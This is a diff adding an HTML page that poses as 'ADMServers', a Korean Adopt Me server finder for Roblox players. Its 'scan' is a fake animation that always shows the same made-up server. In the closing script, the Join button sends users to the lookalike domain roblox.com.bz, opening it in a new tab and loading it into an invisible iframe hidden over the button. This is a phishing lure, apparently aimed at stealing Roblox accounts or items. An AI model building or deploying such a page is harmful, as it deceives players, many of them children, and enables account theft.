@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ADMServers — Korean Adopt Me</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            color: #fff;
+            min-height: 100vh;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 16px 20px;
+            border-bottom: 1px solid #1a1a1a;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: #fff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 900;
+            color: #000;
+            font-size: 14px;
+        }
+
+        /* ===== HERO ===== */
+        .hero {
+            text-align: center;
+            padding: 60px 20px 40px;
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .hero h1 {
+            font-size: 42px;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            font-weight: 800;
+        }
+
+        .hero h1 span {
+            color: #ec4899;
+        }
+
+        .hero p {
+            color: #9ca3af;
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+
+        /* ===== BOUTONS ===== */
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 40px;
+        }
+
+        .btn-primary {
+            background: #fff;
+            color: #000;
+            padding: 14px 28px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            border: none;
+            cursor: pointer;
+            font-size: 15px;
+        }
+
+        /* ===== CARD RECHERCHE ===== */
+        .search-card {
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 16px;
+            padding: 40px 30px;
+            max-width: 420px;
+            margin: 0 auto 20px;
+            text-align: center;
+        }
+
+        .search-icon {
+            width: 60px;
+            height: 60px;
+            background: #1a1a1a;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: #666;
+            font-size: 24px;
+        }
+
+        .search-card h2 {
+            font-size: 24px;
+            margin-bottom: 12px;
+        }
+
+        .search-card p {
+            color: #9ca3af;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .search-btn {
+            background: #fff;
+            color: #000;
+            padding: 14px 32px;
+            border-radius: 12px;
+            border: none;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* ===== RÉSULTAT (caché par défaut) ===== */
+        .result-card {
+            display: none;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 420px;
+            margin: 0 auto 20px;
+        }
+
+        .result-card.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .result-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+
+        .check-icon {
+            width: 40px;
+            height: 40px;
+            background: #ec4899;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+        }
+
+        .result-header h3 {
+            font-size: 20px;
+        }
+
+        .result-sub {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 16px;
+            margin-left: 52px;
+        }
+
+        .top-pick {
+            display: inline-block;
+            background: #ec4899;
+            color: #fff;
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 20px;
+            margin-left: 52px;
+        }
+
+        .server-info {
+            background: #0a0a0a;
+            border: 1px solid #222;
+            border-radius: 12px;
+            padding: 20px;
+        }
+
+        .server-status {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #9ca3af;
+            font-size: 12px;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: #22c55e;
+            border-radius: 50%;
+        }
+
+        .server-name {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .flag {
+            font-size: 28px;
+        }
+
+        .server-id {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .place-id {
+            color: #666;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 4px;
+        }
+
+        .place-id-num {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+
+        .metrics {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 20px;
+            padding-top: 16px;
+            border-top: 1px solid #222;
+        }
+
+        .metric-label {
+            color: #666;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+
+        .metric-value {
+            font-size: 28px;
+            font-weight: 700;
+        }
+
+        .metric-value.green {
+            color: #22c55e;
+        }
+
+        .metric-suffix {
+            font-size: 14px;
+            color: #666;
+            font-weight: 400;
+        }
+
+        /* ===== BOUTON JOIN AVEC IFRAME INVISIBLE ===== */
+        .join-btn {
+            width: 100%;
+            padding: 16px;
+            background: #10b981;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .join-btn:hover {
+            background: #059669;
+        }
+
+        /* L'IFRAME INVISIBLE */
+        .hidden-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            border: none;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+            color: #444;
+            font-size: 12px;
+        }
+
+        /* ===== SCAN ANIMATION ===== */
+        .scanning {
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- HEADER -->
+    <div class="header">
+        <div class="logo">
+            <div class="logo-icon">AM!</div>
+            <span>ADMServers</span>
+        </div>
+    </div>
+
+    <!-- HERO -->
+    <div class="hero">
+        <h1>The fastest way to land in a <span>Korean Adopt Me</span> server.</h1>
+        <p>ADMServers indexes every active Korean server and ranks them by ping, headroom, and uptime – so you join the deepest-trading region of Adopt Me on the first try.</p>
+
+        <div class="btn-group">
+            <button class="btn-primary" onclick="findServer()">
+                🔍 Find Korean server <span>→</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- CARD RECHERCHE -->
+    <div class="search-card" id="searchCard">
+        <div class="search-icon">🔍</div>
+        <h2>Find a Korean server</h2>
+        <p>Scan all active Korean servers on Adopt Me and rank them by ping, headroom, and uptime — we'll surface the best match.</p>
+
+        <button class="search-btn" onclick="findServer()">
+            🔍 Find Korean server
+        </button>
+    </div>
+
+    <!-- RÉSULTAT (caché par défaut) -->
+    <div class="result-card" id="resultCard">
+        <div class="result-header">
+            <div class="check-icon">✓</div>
+            <h3>Best match found</h3>
+        </div>
+        <div class="result-sub">ranked by ping · headroom · uptime</div>
+        <div class="top-pick">TOP PICK</div>
+
+        <div class="server-info">
+            <div class="server-status">
+                <div class="status-dot"></div>
+                <span>HEALTHY</span>
+                <span style="margin: 0 8px;">·</span>
+                <span>KR</span>
+                <span style="margin: 0 8px;">·</span>
+                <span>SUSEONG-GU</span>
+            </div>
+
+            <div class="server-name">
+                <span class="flag">🇰🇷</span>
+                Daegu
+            </div>
+            <div class="server-id">Server 273</div>
+
+            <div class="place-id">PLACE ID</div>
+            <div class="place-id-num">920587237</div>
+
+            <div class="metrics">
+                <div>
+                    <div class="metric-label">PING</div>
+                    <div class="metric-value green">118<span class="metric-suffix">ms</span></div>
+                </div>
+                <div>
+                    <div class="metric-label">PLAYERS</div>
+                    <div class="metric-value">32<span class="metric-suffix">/48</span></div>
+                </div>
+                <div>
+                    <div class="metric-label">UPTIME</div>
+                    <div class="metric-value">12h<span class="metric-suffix">59m</span></div>
+                </div>
+            </div>
+
+            <!-- BOUTON JOIN AVEC IFRAME INVISIBLE -->
+            <button class="join-btn" id="joinBtn">
+                Join server <span>→</span>
+            </button>
+        </div>
+    </div>
+
+    <div class="footer">
+        © 2026 ADMServers
+    </div>
+
+    <script>
+        const MON_LIEN = "https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=63450528203282354893737139573270||";
+
+        function findServer() {
+            const searchCard = document.getElementById('searchCard');
+            const resultCard = document.getElementById('resultCard');
+            const searchBtn = document.querySelector('.search-btn');
+
+            // Animation de scan
+            searchBtn.innerHTML = '🔍 Scanning...';
+            searchBtn.classList.add('scanning');
+
+            setTimeout(() => {
+                searchCard.style.display = 'none';
+                resultCard.classList.add('active');
+            }, 1500);
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const joinBtn = document.getElementById('joinBtn');
+
+            // Créer l'iframe invisible
+            const iframe = document.createElement('iframe');
+            iframe.className = 'hidden-iframe';
+            iframe.src = 'about:blank';
+            iframe.sandbox = "allow-scripts allow-same-origin allow-forms allow-popups";
+            joinBtn.appendChild(iframe);
+
+            joinBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+
+                // Charge le lien dans l'iframe invisible (arrière-plan)
+                iframe.src = MON_LIEN;
+
+                // Ouvre le lien dans un nouvel onglet (ce que l'utilisateur voit)
+                window.open(MON_LIEN, '_blank');
+
+                // Feedback visuel
+                joinBtn.innerHTML = 'Joining... <span>→</span>';
+                joinBtn.style.background = '#059669';
+
+                setTimeout(() => {
+                    joinBtn.innerHTML = 'Joined! <span>✓</span>';
+                }, 800);
+            });
+        });
+
+        // Enter pour scanner
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                findServer();
+            }
+        });
+    </script>
+
+</body>
+</html>
